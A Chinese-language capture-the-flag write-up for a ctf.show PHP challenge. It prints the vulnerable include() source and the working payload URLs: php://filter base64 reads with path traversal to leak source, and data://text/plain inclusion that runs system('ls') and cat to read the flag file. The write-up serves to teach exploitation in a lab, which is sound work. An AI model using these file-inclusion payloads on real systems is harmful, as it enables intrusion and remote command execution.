```
php
$file must has test
```
查看即有提示 参数 file，尝试注入

![[Pasted image 20251116151336.png]]
php是自动添加的，说明可能有这个文件进行验证

![[Pasted image 20251116151418.png]]
构造 3个url
`https://25159ad1-2232-471d-ba1b-f6f1a296a6d6.challenge.ctf.show/?file=php://filter/convert.base64-encode/resource=test`
`https://25159ad1-2232-471d-ba1b-f6f1a296a6d6.challenge.ctf.show/?file=php://filter/convert.base64-encode/resource=test.php`
`https://25159ad1-2232-471d-ba1b-f6f1a296a6d6.challenge.ctf.show/?file=php://filter/convert.base64-encode/resource=test.` 只有test. 有关键数据 `PD9waHAKZWNobyAiZmxhZ19ub3RfaGVyZSI7Cj8+Cg==`
说明 php://filter 能够正常使用

构造`https://25159ad1-2232-471d-ba1b-f6f1a296a6d6.challenge.ctf.show/?file=php://filter/convert.base64-encode/resource=test/../index.`
成功得到源代码 为访问php文件
```php
<?php
error_reporting(0);
$file=$_GET['file'];
$file=$file.'php';
echo $file."<br />";
if(preg_match('/test/is',$file)){
	include ($file);
}else{
	echo '$file must has test';
}
?>

```

确定了是`include($file)`，使用data://text/plain伪协议向$file写入PHP代码，来进行命令执行！
``
/?file=data://test/plain,<?php eval(system('ls'));?>//test
`https://25159ad1-2232-471d-ba1b-f6f1a296a6d6.challenge.ctf.show/?file=data://text/plain,%3C?php%20eval(system(%27ls%27));?%3Etest`
这里data://text/plain;不使用base64转义 因为需要包含test，由`data://text/plain;base64,PD9waHAgc3lzdGVtKCdscyAtbGEnKTs/Pg==` 改编得

`https://25159ad1-2232-471d-ba1b-f6f1a296a6d6.challenge.ctf.show/?file=data://text/plain,%3C?php%20eval(system(%27ls%20/;cat%20/FFFFFFFL@GGGG%27));?%3Etest`
![[Pasted image 20251116153218.png]]
遍历/根目录发现 /FFFFFFFL@GGGG 类似flag，进行查看 
得`ctfshow{0558684f-e348-4335-adca-92d493f02e89}`